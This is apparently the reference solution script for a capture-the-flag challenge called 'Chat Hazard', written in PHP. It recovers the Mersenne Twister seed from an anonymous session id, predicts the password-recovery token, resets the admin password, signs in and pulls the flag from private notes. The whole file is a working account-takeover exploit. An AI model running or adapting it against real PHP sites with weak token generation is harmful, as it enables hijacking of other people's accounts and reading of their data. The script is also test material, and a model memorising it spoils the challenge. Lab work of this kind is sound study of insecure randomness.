#!/usr/bin/env php
<?php
/**
 * Chat Hazard - reference solution.
 *
 * Takes over the admin account using nothing but the session id the site hands
 * out on every anonymous request, then reads its private notes.
 *
 * Usage:
 *     php solve.php --url http://127.0.0.1:8009
 *     php solve.php --url http://127.0.0.1:8009 -v
 *
 * No dependencies: PHP CLI >= 7.1 is enough. The solver is written in PHP
 * because it replays PHP's Mersenne Twister, which is seeded differently from
 * the one in other languages.
 */

const ALPHABET   = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
const TOKEN_LEN  = 16;
const SID_MIN    = 1000000000;
const SID_MAX    = 9999999999;
const SEEDS      = 1000000;

$verbose = false;

// ---------------------------------------------------------------------------
// HTTP
// ---------------------------------------------------------------------------

/**
 * Returns [status, body, session id the server just set (or null)].
 */
function request(string $url, ?array $form = null, ?string $sid = null): array
{
    global $verbose;

    $headers = [];
    $body    = null;

    if ($form !== null) {
        $body      = http_build_query($form);
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    }
    if ($sid !== null) {
        $headers[] = 'Cookie: sid=' . $sid;
    }

    $method = $form === null ? 'GET' : 'POST';

    if ($verbose) {
        echo "\n> $method $url\n";
        foreach ($headers as $header) {
            echo "> $header\n";
        }
        if ($body !== null) {
            echo ">\n> $body\n";
        }
    }

    $context = stream_context_create(['http' => [
        'method'          => $method,
        'header'          => implode("\r\n", $headers),
        'content'         => $body,
        'ignore_errors'   => true,
        'follow_location' => 0,
        'timeout'         => 15,
    ]]);

    $page = @file_get_contents($url, false, $context);
    if ($page === false) {
        fwrite(STDERR, "[-] cannot reach $url\n");
        exit(1);
    }

    $status  = 0;
    $new_sid = null;
    foreach ($http_response_header as $line) {
        if (preg_match('#^HTTP/\S+\s+(\d{3})#', $line, $m)) {
            $status = (int) $m[1];
        }
        if (preg_match('/^Set-Cookie:\s*sid=([0-9]+)/i', $line, $m)) {
            $new_sid = $m[1];
        }
    }

    if ($verbose) {
        echo "< HTTP $status\n";
        foreach ($http_response_header as $line) {
            if (!preg_match('#^HTTP/#', $line)) {
                echo "< $line\n";
            }
        }
        echo "<\n< " . str_replace("\n", "\n< ", rtrim($page)) . "\n";
    }

    return [$status, $page, $new_sid];
}

// ---------------------------------------------------------------------------
// Breaking the generator
// ---------------------------------------------------------------------------

/** Every seed in 0..999999 that produces this session id. */
function candidate_seeds(string $sid): array
{
    $target = (int) $sid;
    $seeds  = [];

    for ($seed = 0; $seed < SEEDS; $seed++) {
        mt_srand($seed);
        if (mt_rand(SID_MIN, SID_MAX) === $target) {
            $seeds[] = $seed;
        }
    }

    return $seeds;
}

/** Replay the stream: draw #1 is the session id, draw #2 is the token. */
function token_for_seed(int $seed): string
{
    mt_srand($seed);
    mt_rand(SID_MIN, SID_MAX);                       // draw #1, already known
    return substr(str_shuffle(ALPHABET), 0, TOKEN_LEN); // draw #2, the secret
}

// ---------------------------------------------------------------------------

function parse_args(array $argv): array
{
    $options = [
        'url'      => 'http://127.0.0.1:8009',
        'target'   => 'admin',
        'password' => 'catnip',
    ];

    for ($i = 1; $i < count($argv); $i++) {
        $arg = $argv[$i];
        if ($arg === '-v' || $arg === '--verbose') {
            $GLOBALS['verbose'] = true;
        } elseif ($arg === '-h' || $arg === '--help') {
            echo "usage: solve.php [--url URL] [--target USER] [--password PASS] [-v]\n";
            exit(0);
        } elseif (preg_match('/^--(url|target|password)$/', $arg, $m)) {
            $options[$m[1]] = $argv[++$i] ?? '';
        } else {
            fwrite(STDERR, "unknown option: $arg\n");
            exit(1);
        }
    }

    $options['url'] = rtrim($options['url'], '/');
    return $options;
}

$opt  = parse_args($argv);
$base = $opt['url'];

// 1. Ask for a recovery link WITHOUT a cookie, so the server opens a session in
//    this very request and draws the token from the same generator.
echo "[*] requesting a recovery link for '{$opt['target']}'\n";
[$status, , $sid] = request("$base/forgot.php", ['account' => $opt['target']]);

if ($sid === null) {
    echo "[-] no session was opened by that response: send the request without a cookie.\n";
    exit(1);
}
echo "[+] HTTP $status, session id $sid\n";

// 2. Recover the seed.
echo "[*] searching 10^6 candidate seeds...\n";
$start = microtime(true);
$seeds = candidate_seeds($sid);
printf("[+] %d seed(s) in %.1f s: %s\n", count($seeds), microtime(true) - $start, implode(', ', $seeds));

if (!$seeds) {
    echo "[-] no seed matches.\n";
    exit(1);
}

// 3. Replay the stream and try each candidate token.
$ok = false;
foreach ($seeds as $seed) {
    $token = token_for_seed($seed);
    echo "[*] seed $seed -> token $token\n";

    [$status, $page, ] = request("$base/recovery.php", [
        'token'    => $token,
        'password' => $opt['password'],
    ]);

    if ($status === 200 && str_contains($page, 'Password updated')) {
        echo "[+] password updated\n";
        $ok = true;
        break;
    }
    echo "[-] token rejected\n";
}

if (!$ok) {
    echo "[-] no candidate token was accepted.\n";
    exit(1);
}

// 4. Sign in and read the private notes.
[$status, , $sid] = request("$base/login.php", [
    'username' => $opt['target'],
    'password' => $opt['password'],
]);
if ($status !== 302) {
    echo "[-] sign-in failed (HTTP $status)\n";
    exit(1);
}
echo "[+] signed in as '{$opt['target']}'\n";

[, $page, ] = request("$base/index.php", null, $sid);

preg_match_all('/name="note"[^>]*value="([^"]*)"/', $page, $matches);
$notes = array_filter(array_map('html_entity_decode', $matches[1]));

echo "[*] private notes:\n";
foreach ($notes as $note) {
    echo "      $note\n";
}

if (!preg_match('/CYBN\{[^}]*\}/', implode("\n", $notes), $m)) {
    echo "[-] no flag in the notes.\n";
    exit(1);
}
echo "\n[FLAG] {$m[0]}\n";
